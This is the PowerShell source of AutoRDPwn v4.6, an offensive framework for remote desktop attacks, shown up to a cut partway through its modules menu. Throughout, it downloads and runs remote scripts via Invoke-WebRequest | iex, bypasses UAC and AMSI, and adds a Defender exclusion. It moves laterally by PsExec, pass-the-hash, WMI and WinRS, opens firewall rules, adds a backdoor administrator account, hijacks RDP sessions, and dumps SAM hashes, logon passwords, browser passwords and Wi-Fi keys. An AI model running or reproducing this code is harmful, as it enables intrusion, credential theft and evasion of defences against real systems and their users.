[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1" -UseBasicParsing | iex
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico" -OutFile AutoRDPwn.ico -UseBasicParsing ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1" -OutFile Set-ConsoleIcon.ps1 -UseBasicParsing ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.6 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off

function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host
     Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
     Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
     Write-Host " /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/| |    \  |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
     Write-Host "/  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \| |____/  |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host "\  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_________/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host " \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/                " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
     Write-Host
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.6" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host }

function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
     Write-Host }

function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - InvokeCommand / PSSession" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Session Hijacking (local)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }

function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt17" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }

function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function Test-Command {
    Param ($command)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = 'stop'
    try {if(Get-Command $command){RETURN $true}}
    Catch {RETURN $false}
    Finally {$ErrorActionPreference=$oldPreference}}

    do { Show-Banner ; Show-Language
    $help = 'The detailed guide of use can be found at the following link:'
    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()
    switch ($input) {
       '1' { $Language = 'English' }
       '2' { $Language = 'Spanish' }
       'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; sleep -milliseconds 7500 }
       'X' { continue }
    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
    $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()

if($Language -in 'English') {
  $txt1  = "Load additional modules"
  $txt2  = "Close the program"
  $txt3  = "Your version of Powershell is not compatible with this script :("
  $txt4  = "You can download the latest version here"
  $txt5  = "Your operating system is not compatible with this attack, choose another one"
  $txt6  = "Incorrect option, try again"
  $txt7  = "Choose how you want to launch the attack:` "
  $txt8  = "Choose the module you want to load:` "
  $txt9  = "Recover local hashes with Mimikatz"
  $txt10 = "Recover system passwords with Mimikatz"
  $txt11 = "Rebuild the image cache"
  $txt12 = "Retrieve remote desktop history"
  $txt13 = "$system system detected, downloading Mimikatz.."
  $txt14 = "Redirect a local port"
  $txt15 = "Redirect a remote port"
  $txt16 = "Check actual redirections"
  $txt17 = "Remote Access"
  $txt18 = "Deactivate system logs"
  $txt19 = "This process can take several minutes.."
  $txt20 = "Delete all redirections"
  $txt21 = "Module loaded successfully!"
  $txt22 = "Return to the main menu"
  $txt23 = "What is the IP of the server?:` "
  $txt24 = "And the user?:` "
  $txt25 = "Enter the password:` "
  $txt26 = "Enter the domain:` "
  $txt27 = "Finally, the NTLM hash:` "
  $txt28 = "Elevating privileges with token duplication.."
  $txt29 = "Do you want to see or control the computer?:` "
  $txt30 = "Modifying permissions to view the remote computer.."
  $txt31 = "Modifying permissions to control the remote computer.."
  $txt32 = "Changes in the Windows registry made successfully!"
  $txt33 = "Detecting operating system version on` "
  $txt34 = "detected"
  $txt35 = "Looking for active sessions on the computer.."
  $txt36 = "What session do you want to connect to?:` "
  $txt37 = "detected, applying patch.."
  $txt38 = "Starting remote connection!"
  $txt39 = "Semi-interactive console"
  $txt40 = "Something went wrong, closing the program.."
  $txt41 = "Enter the local port:` "
  $txt42 = "Which interface do you want to use?:` "
  $txt43 = "Enter the remote port:` "
  $txt44 = "Finally, the destination IP:` "
  $txt45 = "Redirection created successfuly!"
  $txt46 = "The redirection will be created on the remote computer"
  $txt47 = "There is no redirection to show"
  $txt48 = "All redirects have been deleted"
  $txt49 = "Recover browsers passwords with SharpWeb"
  $txt50 = "Passwords and hashes"
  $txt51 = "Netcat console (direct connection)"
  $txt52 = "Netcat console (reverse connection)"
  $txt53 = "Enter the port to listen to:` "
  $txt54 = "Enter the remote IP:` "
  $txt55 = "Enter the IP or network range:` "
  $txt56 = "Enter the scanning speed (1-5):` "
  $txt57 = "Enter the number of ports to scan (25-1000):` "
  $txt58 = "All User Profile"
  $txt59 = "Recover Wi-Fi passwords"
  $txt60 = "There is no wireless network on this computer"
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
  $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
  $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
  $Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
  $Pwn6  = "RDP session agent" }

if($Language -in 'Spanish') {
  $txt1  = "Cargar módulos adicionales"
  $txt2  = "Cerrar el programa"
  $txt3  = "Tu versión de Powershell no es compatible con este script :("
  $txt4  = "Puedes descargar la última versión aquí"
  $txt5  = "Tu sistema operativo no es compatible con este ataque, elige otro"
  $txt6  = "Opción incorrecta, vuelve a intentarlo de nuevo"
  $txt7  = "Elige cómo quieres lanzar el ataque:` "
  $txt8  = "Elige el módulo que quieres cargar:` "
  $txt9  = "Recuperar hashes locales con Mimikatz"
  $txt10 = "Recuperar contraseñas del sistema con Mimikatz"
  $txt11 = "Reconstruir la caché de imágenes"
  $txt12 = "Recuperar historial de escritorio remoto"
  $txt13 = "Sistema de $system detectado, descargando Mimikatz.."
  $txt14 = "Redireccionar un puerto local"
  $txt15 = "Redireccionar un puerto remoto"
  $txt16 = "Consultar redirecciones creadas"
  $txt17 = "Acceso Remoto"
  $txt18 = "Desactivar logs del sistema"
  $txt19 = "Este proceso puede tardar varios minutos.."
  $txt20 = "Eliminar todas las redirecciones"
  $txt21 = "Módulo cargado con éxito!"
  $txt22 = "Volver al menú principal"
  $txt23 = "Cuál es la IP del servidor?:` "
  $txt24 = "Y el usuario?:` "
  $txt25 = "Escribe la contraseña:` "
  $txt26 = "Introduce el dominio:` "
  $txt27 = "Por último, el hash NTLM:` "
  $txt28 = "Elevando privilegios con token duplication.."
  $txt29 = "Quieres ver o controlar el equipo?:` "
  $txt30 = "Modificando permisos para visualizar el equipo remoto.."
  $txt31 = "Modificando permisos para controlar el equipo remoto.."
  $txt32 = "Cambios en el registro de Windows realizados con éxito!"
  $txt33 = "Detectando versión del sistema operativo en` "
  $txt34 = "detectado"
  $txt35 = "Buscando sesiones activas en el equipo.."
  $txt36 = "A qué sesión quieres conectarte?:` "
  $txt37 = "detectado, aplicando parche.."
  $txt38 = "Iniciando conexión remota!"
  $txt39 = "Consola semi-interactiva"
  $txt40 = "Algo salió mal, cerrando el programa.."
  $txt41 = "Introduce el puerto local:` "
  $txt42 = "Qué interfaz quieres usar?:` "
  $txt43 = "Introduce el puerto remoto:` "
  $txt44 = "Por último, la IP de destino:` "
  $txt45 = "Redirección creada correctamente!"
  $txt46 = "La redirección se creará en la equipo remoto"
  $txt47 = "No existe ninguna redirección para mostrar"
  $txt48 = "Todas las redirecciones han sido eliminadas"
  $txt49 = "Recuperar contraseñas de los navegadores con SharpWeb"
  $txt50 = "Contraseñas y hashes"
  $txt51 = "Consola de Netcat (conexión directa)"
  $txt52 = "Consola de Netcat (conexión inversa)"
  $txt53 = "Introduce el puerto a escuchar:` "
  $txt54 = "Introduce la IP remota:` "
  $txt55 = "Introduce la IP o el rango de red:` "
  $txt56 = "Introduce la velocidad de escaneo (1-5):` "
  $txt57 = "Introduce la cantidad de puertos a escanear (25-1000):` "
  $txt58 = "Perfil de todos los usuarios"
  $txt59 = "Recuperar contraseñas Wi-Fi"
  $txt60 = "No existe ninguna red inalámbrica en este equipo"
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
  $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
  $Pwn4  = "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
  $Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
  $Pwn6  = "Agente de sesión de RDP" }

    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host""
    if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
    Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
    else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim() ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
    if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AMSI } else { $null }}

    do { Show-Banner ; Show-Menu
    $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {

        '1' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
	.\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn4" -nobanner -accepteula
        del .\psexec.exe }

        '2' {
	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
        $domain = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
        $hash = $Host.UI.ReadLine()
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5" }

	'3' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4" }

        '4' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        $PSSession = New-PSSession -Computer $computer -credential $credential
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn1 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn2 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn3 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn4 }}

        '5' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn4" }

	'6' {
        Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt28" -ForegroundColor Blue ; Write-Host
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Get-System.ps1" -UseBasicParsing | iex
        Get-System -Technique Token ; Write-Host ; Write-Host "$using:txt33" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session ; Write-Host
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine()
	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        else{ Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 ; $input = $null ; Show-Banner ; Show-Menu }}

        'M' { Show-Banner ; Show-Modules
        $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine() ; Write-Host

        if($module -like '1') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host

        if($shell -like '1'){ $console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
        
        if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $netcat = 'local'
        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; sleep -milliseconds 2500 }

        if($shell -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $netcat = 'remote'
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; sleep -milliseconds 2500 }

        if($shell -like 'X'){ $input = 'x' ; continue }
        if($shell -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        if($module -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt10" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt49" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt59" -ForegroundColor Gray    
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $mimikatz = $Host.UI.ReadLine() ; Write-Host

        if($mimikatz -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
        Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($mimikatz -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
        Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray'
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit"
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($mimikatz -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SharpWeb.ps1" -UseBasicParsing | iex
        .\SharpWeb.exe all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; del .\SharpWeb.exe ; sleep -milliseconds 2500 }

        if($mimikatz -like '4') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500	; $Host.UI.RawUI.ForegroundColor = 'Gray'
	function Get-Wlan-Keys {[CmdletBinding()]Param ()
        $wlans = netsh wlan show profiles | Select-String -Pattern "$txt58" | Foreach-Object {$_.ToString()}
        $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
        $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
	$wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host ; Write-Host "$txt60" -ForegroundColor Red ; sleep -milliseconds 4000 } 
	else { $wifikey ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }}
	
        if($mimikatz -like 'X'){ $input = 'x' ; continue }
        if($mimikatz -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        if($module -like '3') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - TCP Port Scan" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Port Forwarding" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
